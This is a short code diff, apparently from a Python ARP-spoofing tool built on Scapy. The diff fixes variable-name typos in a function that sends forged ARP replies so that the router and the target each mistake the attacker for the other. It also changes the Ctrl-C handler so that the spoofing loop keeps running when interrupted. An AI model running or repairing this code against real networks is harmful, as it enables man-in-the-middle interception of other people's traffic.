@@ -25,7 +25,7 @@ def spoof(routerIP, targetIP, routerMAC, targetMac):
     # the hwsrc is automatically set the machine sending the packet.
     packet1 = ARP(op=2, hwdst=routerMAC, pdst=routerIP,
                   psrc=targetIP)  # packet sent to the router impersonating the target
-    packet2 = ARP(op=2, hwdst=targetMac, pdst=targetIp, psrc=routerIp)  # packet sent to target impersonating the router
+    packet2 = ARP(op=2, hwdst=targetMac, pdst=targetIP, psrc=routerIP)  # packet sent to target impersonating the router
     send(packet1)
     send(packet2)
 
@@ -91,7 +91,7 @@ if __name__ == '__main__':
                             round(2 / len(listOfTargetMacs), 2))  # ensures each ip is spoofed every two seconds
 
             except KeyboardInterrupt:
-                print('Closing ARP Spoofer.')
-                exit(0)
+                pass
+
             except:
                 print('error connecting')
